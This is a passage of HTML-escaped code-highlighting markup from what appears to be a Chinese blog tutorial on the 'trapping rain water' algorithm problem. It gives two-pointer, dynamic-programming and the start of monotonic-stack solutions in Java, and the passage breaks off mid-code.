&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r_max&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;动态规划&#34;&gt;动态规划&lt;/h2&gt;
&lt;p&gt;定义left[i]表示下标i位置及其左边的最高柱子的高度，right[i]表示下标i位置及其右边的最高柱子的高度，下标i位置能接的雨水量为min(left[i],right[i])-height[i],遍历数组，计算出left[i]和right[i]，最后答案为min(left[i],right[i])-height[i]里i从0到n-1的求和总值&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;trap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ans&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ans&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;min&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ans&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;单调栈&#34;&gt;单调栈&lt;/h2&gt;
&lt;p&gt;单调栈就是保持栈内元素有序。和栈与队列：单调队列一样，需要我们自己维持顺序，没有现成的容器可以用。&lt;/p&gt;
&lt;p&gt;通常是一维数组，要寻找任一个元素的右边或者左边第一个比自己大或者小的元素的位置，此时我们就要想到可以用单调栈了。&lt;/p&gt;
&lt;p&gt;而接雨水这道题目，我们正需要寻找一个元素，右边最大元素以及左边最大元素，来计算雨水面积。&lt;/p&gt;
&lt;p&gt;先将下标0的柱子加入到栈中，st.push(0);。 栈中存放我们遍历过的元素，所以先将下标0加进来。&lt;/p&gt;
&lt;p&gt;然后开始从下标1开始遍历所有的柱子，for (int i = 1; i &amp;lt; height.size(); i++)。&lt;/p&gt;
&lt;p&gt;如果当前遍历的元素（柱子）高度小于栈顶元素的高度，就把这个元素加入栈中，因为栈里本来就要保持从小到大的顺序（从栈头到栈底）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;trap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
